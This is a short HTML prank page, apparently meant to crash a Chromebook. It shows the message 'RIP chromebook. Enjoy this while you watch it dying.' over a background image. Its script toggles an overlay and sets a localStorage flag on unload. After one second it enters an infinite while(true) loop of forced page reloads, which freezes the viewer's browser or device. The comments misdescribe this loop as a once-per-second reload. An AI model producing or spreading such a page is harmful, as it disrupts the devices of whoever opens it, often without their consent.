<!DOCTYPE html>
<html>
<head>
<style>
  body {
    background-image: url('https://static.wikia.nocookie.net/0cb14c7d-fe27-403b-bbd3-82623b2ba782/scale-to-width/755');
    background-size: cover;
    background-position: center;
    color: white;
    font-family: Arial, sans-serif;
    text-align: center;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  p {
    font-size: 24px;
  }
</style>
</head>
<body>

<p>RIP chromebook. Enjoy this while you watch it dying.</p>

<div id="overlay"></div>

<script>
  // Function to show the overlay with black box below the text
  function showOverlay() {
    document.getElementById('overlay').style.display = 'block';
  }

  // Function to hide the overlay
  function hideOverlay() {
    document.getElementById('overlay').style.display = 'none';
  }

  // Show overlay with black box after 0.5 seconds
  setTimeout(showOverlay, 500);

  // Hide overlay after 5 seconds
  setTimeout(hideOverlay, 5000);

  // Set a value in localStorage before unloading the page
  window.onbeforeunload = function() {
    localStorage.setItem('unloadFlag', '1');
  };

  // Periodically reload the page every 1 second (1000 milliseconds)
  setTimeout(function() {
    while (true) {
      location.reload(true); // Reload the page with cache-busting
    }
  }, 1000);
</script>

</body>
</html>
